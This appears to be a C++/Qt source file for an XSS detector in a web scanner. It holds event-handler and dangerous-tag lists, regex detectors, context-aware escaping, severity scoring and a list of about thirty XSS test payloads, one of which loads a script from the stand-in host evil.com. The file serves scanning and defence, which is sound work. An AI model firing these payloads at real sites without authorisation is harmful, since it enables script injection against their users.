#include "xssdetector.h"
#include <QRegularExpression>
#include <QMap>

namespace {

const QStringList eventHandlers = {
    QStringLiteral("onabort"),
    QStringLiteral("onactivate"),
    QStringLiteral("onafterprint"),
    QStringLiteral("onafterupdate"),
    QStringLiteral("onbeforeactivate"),
    QStringLiteral("onbeforecopy"),
    QStringLiteral("onbeforecut"),
    QStringLiteral("onbeforedeactivate"),
    QStringLiteral("onbeforeeditfocus"),
    QStringLiteral("onbeforepaste"),
    QStringLiteral("onbeforeprint"),
    QStringLiteral("onbeforeunload"),
    QStringLiteral("onbeforeupdate"),
    QStringLiteral("onblur"),
    QStringLiteral("onbounce"),
    QStringLiteral("oncellchange"),
    QStringLiteral("onchange"),
    QStringLiteral("onclick"),
    QStringLiteral("oncontextmenu"),
    QStringLiteral("oncontrolselect"),
    QStringLiteral("oncopy"),
    QStringLiteral("oncut"),
    QStringLiteral("ondataavailable"),
    QStringLiteral("ondatasetchanged"),
    QStringLiteral("ondatasetcomplete"),
    QStringLiteral("ondblclick"),
    QStringLiteral("ondeactivate"),
    QStringLiteral("ondrag"),
    QStringLiteral("ondragend"),
    QStringLiteral("ondragenter"),
    QStringLiteral("ondragleave"),
    QStringLiteral("ondragover"),
    QStringLiteral("ondragstart"),
    QStringLiteral("ondrop"),
    QStringLiteral("onerror"),
    QStringLiteral("onerrorupdate"),
    QStringLiteral("onfilterchange"),
    QStringLiteral("onfinish"),
    QStringLiteral("onfocus"),
    QStringLiteral("onfocusin"),
    QStringLiteral("onfocusout"),
    QStringLiteral("onhashchange"),
    QStringLiteral("onhelp"),
    QStringLiteral("oninput"),
    QStringLiteral("onkeydown"),
    QStringLiteral("onkeypress"),
    QStringLiteral("onkeyup"),
    QStringLiteral("onlayoutcomplete"),
    QStringLiteral("onload"),
    QStringLiteral("onlosecapture"),
    QStringLiteral("onmessage"),
    QStringLiteral("onmousedown"),
    QStringLiteral("onmouseenter"),
    QStringLiteral("onmouseleave"),
    QStringLiteral("onmousemove"),
    QStringLiteral("onmouseout"),
    QStringLiteral("onmouseover"),
    QStringLiteral("onmouseup"),
    QStringLiteral("onmousewheel"),
    QStringLiteral("onmove"),
    QStringLiteral("onmoveend"),
    QStringLiteral("onmovestart"),
    QStringLiteral("onoffline"),
    QStringLiteral("ononline"),
    QStringLiteral("onpageshow"),
    QStringLiteral("onpagehide"),
    QStringLiteral("onpaste"),
    QStringLiteral("onpopstate"),
    QStringLiteral("onprogress"),
    QStringLiteral("onpropertychange"),
    QStringLiteral("onreadystatechange"),
    QStringLiteral("onreset"),
    QStringLiteral("onresize"),
    QStringLiteral("onresizeend"),
    QStringLiteral("onresizestart"),
    QStringLiteral("onrowenter"),
    QStringLiteral("onrowexit"),
    QStringLiteral("onrowsdelete"),
    QStringLiteral("onrowsinserted"),
    QStringLiteral("onscroll"),
    QStringLiteral("onselect"),
    QStringLiteral("onselectionchange"),
    QStringLiteral("onselectstart"),
    QStringLiteral("onstart"),
    QStringLiteral("onstop"),
    QStringLiteral("onstorage"),
    QStringLiteral("onsubmit"),
    QStringLiteral("ontimeupdate"),
    QStringLiteral("onunload"),
    QStringLiteral("onwaiting")
};

const QStringList xssPayloads = {
    QStringLiteral("<script>alert(1)</script>"),
    QStringLiteral("<img src=x onerror=alert(1)>"),
    QStringLiteral("<svg onload=alert(1)>"),
    QStringLiteral("<body onload=alert(1)>"),
    QStringLiteral("<iframe src=javascript:alert(1)>"),
    QStringLiteral("<input onfocus=alert(1) autofocus>"),
    QStringLiteral("<marquee onstart=alert(1)>"),
    QStringLiteral("<video><source onerror=alert(1)>"),
    QStringLiteral("<audio src=x onerror=alert(1)>"),
    QStringLiteral("<details ontoggle=alert(1) open>"),
    QStringLiteral("<math><a xlink:href=javascript:alert(1)>"),
    QStringLiteral("<object data=javascript:alert(1)>"),
    QStringLiteral("<form><button formaction=javascript:alert(1)>"),
    QStringLiteral("<isindex action=javascript:alert(1) type=submit>"),
    QStringLiteral("<embed src=javascript:alert(1)>"),
    QStringLiteral("<a href=javascript:alert(1)>click</a>"),
    QStringLiteral("\"><script>alert(1)</script>"),
    QStringLiteral("'><script>alert(1)</script>"),
    QStringLiteral("</script><script>alert(1)</script>"),
    QStringLiteral("<img/src=x onerror=alert(1)>"),
    QStringLiteral("<IMG SRC=x onerror=\"alert(1)\">"),
    QStringLiteral("<svg/onload=alert(1)>"),
    QStringLiteral("<ScRiPt>alert(1)</ScRiPt>"),
    QStringLiteral("<SCRIPT SRC=//evil.com/xss.js>"),
    QStringLiteral("javascript:alert(1)"),
    QStringLiteral("jaVasCript:alert(1)"),
    QStringLiteral("data:text/html,<script>alert(1)</script>"),
    QStringLiteral("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"),
    QStringLiteral("%3Cscript%3Ealert(1)%3C/script%3E"),
    QStringLiteral("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e")
};

const QStringList dangerousTags = {
    QStringLiteral("script"),
    QStringLiteral("iframe"),
    QStringLiteral("object"),
    QStringLiteral("embed"),
    QStringLiteral("applet"),
    QStringLiteral("form"),
    QStringLiteral("input"),
    QStringLiteral("button"),
    QStringLiteral("select"),
    QStringLiteral("textarea"),
    QStringLiteral("link"),
    QStringLiteral("style"),
    QStringLiteral("base"),
    QStringLiteral("meta")
};

const QStringList dangerousAttributes = {
    QStringLiteral("href"),
    QStringLiteral("src"),
    QStringLiteral("data"),
    QStringLiteral("action"),
    QStringLiteral("formaction"),
    QStringLiteral("srcdoc"),
    QStringLiteral("xlink:href"),
    QStringLiteral("content"),
    QStringLiteral("poster"),
    QStringLiteral("background"),
    QStringLiteral("dynsrc"),
    QStringLiteral("lowsrc")
};

bool containsScriptTag(const QString &text) {
    QRegularExpression re(QStringLiteral("<\\s*script[^>]*>"),
                          QRegularExpression::CaseInsensitiveOption);
    return re.match(text).hasMatch();
}

bool containsEventHandler(const QString &text) {
    for (const QString &handler : eventHandlers) {
        QRegularExpression re(handler + QStringLiteral("\\s*="),
                              QRegularExpression::CaseInsensitiveOption);
        if (re.match(text).hasMatch()) {
            return true;
        }
    }
    return false;
}

bool containsJavascriptUri(const QString &text) {
    QRegularExpression re(QStringLiteral("javascript\\s*:"),
                          QRegularExpression::CaseInsensitiveOption);
    return re.match(text).hasMatch();
}

bool containsDataUri(const QString &text) {
    QRegularExpression re(QStringLiteral("data\\s*:[^,]*,"),
                          QRegularExpression::CaseInsensitiveOption);
    return re.match(text).hasMatch();
}

bool containsVbscriptUri(const QString &text) {
    QRegularExpression re(QStringLiteral("vbscript\\s*:"),
                          QRegularExpression::CaseInsensitiveOption);
    return re.match(text).hasMatch();
}

} // anonymous namespace


XssDetector::XssType XssDetector::detectInResponse(const QString &responseBody, const QString &payload) const
{
    if (responseBody.isEmpty() || payload.isEmpty()) {
        return XssType::None;
    }

    int pos = responseBody.indexOf(payload, 0, Qt::CaseInsensitive);
    if (pos == -1) {
        return XssType::None;
    }

    Context ctx = determineContext(responseBody, pos);

    switch (ctx) {
    case Context::JavaScript:
        return XssType::ReflectedInScript;
    case Context::HtmlAttribute:
        return XssType::ReflectedInAttribute;
    case Context::HtmlBody:
        return XssType::ReflectedInBody;
    default:
        return XssType::ReflectedInBody;
    }
}

XssDetector::XssType XssDetector::detectInUri(const QUrl &url) const
{
    QString urlStr = url.toString();

    if (containsJavascriptUri(urlStr) || containsVbscriptUri(urlStr) || containsDataUri(urlStr)) {
        return XssType::ReflectedInUrl;
    }

    if (containsScriptTag(urlStr) || containsEventHandler(urlStr)) {
        return XssType::ReflectedInUrl;
    }

    return XssType::None;
}

XssDetector::XssType XssDetector::detectInHeaders(const QMap<QString, QString> &headers) const
{
    for (auto it = headers.constBegin(); it != headers.constEnd(); ++it) {
        const QString &value = it.value();
        if (containsScriptTag(value) || containsEventHandler(value) ||
            containsJavascriptUri(value)) {
            return XssType::ReflectedInHeader;
        }
    }
    return XssType::None;
}

bool XssDetector::isVulnerable(const QString &responseBody, const QString &payload) const
{
    return detectInResponse(responseBody, payload) != XssType::None;
}

XssDetector::Context XssDetector::determineContext(const QString &responseBody, int position) const
{
    QString before = responseBody.left(position);

    QRegularExpression scriptRe(QStringLiteral("<script[^>]*>(?:(?!</script>).)*$"),
                                QRegularExpression::CaseInsensitiveOption |
                                QRegularExpression::DotMatchesEverythingOption);
    if (scriptRe.match(before).hasMatch()) {
        return Context::JavaScript;
    }

    QRegularExpression attrRe(QStringLiteral("<[a-z][^>]*\\s[a-z-]+\\s*=\\s*[\"']?[^\"'>]*$"),
                              QRegularExpression::CaseInsensitiveOption);
    if (attrRe.match(before).hasMatch()) {
        return Context::HtmlAttribute;
    }

    QRegularExpression styleRe(QStringLiteral("<style[^>]*>(?:(?!</style>).)*$"),
                               QRegularExpression::CaseInsensitiveOption |
                               QRegularExpression::DotMatchesEverythingOption);
    if (styleRe.match(before).hasMatch()) {
        return Context::Css;
    }

    QRegularExpression commentRe(QStringLiteral("<!--(?:(?!-->).)*$"),
                                 QRegularExpression::DotMatchesEverythingOption);
    if (commentRe.match(before).hasMatch()) {
        return Context::Comment;
    }

    return Context::HtmlBody;
}

QStringList XssDetector::getPayloads()
{
    return xssPayloads;
}

QStringList XssDetector::getEventHandlers()
{
    return eventHandlers;
}

QString XssDetector::escapeForContext(const QString &input, Context context)
{
    QString result = input;

    switch (context) {
    case Context::HtmlBody:
        result.replace(QStringLiteral("&"), QStringLiteral("&amp;"));
        result.replace(QStringLiteral("<"), QStringLiteral("&lt;"));
        result.replace(QStringLiteral(">"), QStringLiteral("&gt;"));
        break;

    case Context::HtmlAttribute:
        result.replace(QStringLiteral("&"), QStringLiteral("&amp;"));
        result.replace(QStringLiteral("<"), QStringLiteral("&lt;"));
        result.replace(QStringLiteral(">"), QStringLiteral("&gt;"));
        result.replace(QStringLiteral("\""), QStringLiteral("&quot;"));
        result.replace(QStringLiteral("'"), QStringLiteral("&#x27;"));
        break;

    case Context::JavaScript:
        result.replace(QStringLiteral("\\"), QStringLiteral("\\\\"));
        result.replace(QStringLiteral("'"), QStringLiteral("\\'"));
        result.replace(QStringLiteral("\""), QStringLiteral("\\\""));
        result.replace(QStringLiteral("\n"), QStringLiteral("\\n"));
        result.replace(QStringLiteral("\r"), QStringLiteral("\\r"));
        result.replace(QStringLiteral("<"), QStringLiteral("\\x3c"));
        result.replace(QStringLiteral(">"), QStringLiteral("\\x3e"));
        break;

    case Context::Url:
        result = QUrl::toPercentEncoding(result);
        break;

    case Context::Css:
        result.replace(QStringLiteral("\\"), QStringLiteral("\\\\"));
        result.replace(QStringLiteral("<"), QStringLiteral("\\3c "));
        result.replace(QStringLiteral(">"), QStringLiteral("\\3e "));
        result.replace(QStringLiteral("("), QStringLiteral("\\28 "));
        result.replace(QStringLiteral(")"), QStringLiteral("\\29 "));
        break;

    default:
        break;
    }

    return result;
}

int XssDetector::severityLevel(XssType type)
{
    switch (type) {
    case XssType::StoredXss:
        return 4; // Critical
    case XssType::ReflectedInScript:
        return 3; // High
    case XssType::ReflectedInBody:
    case XssType::ReflectedInAttribute:
    case XssType::ReflectedInUrl:
        return 2; // Medium
    case XssType::ReflectedInHeader:
    case XssType::DomBased:
        return 2; // Medium
    default:
        return 0;
    }
}
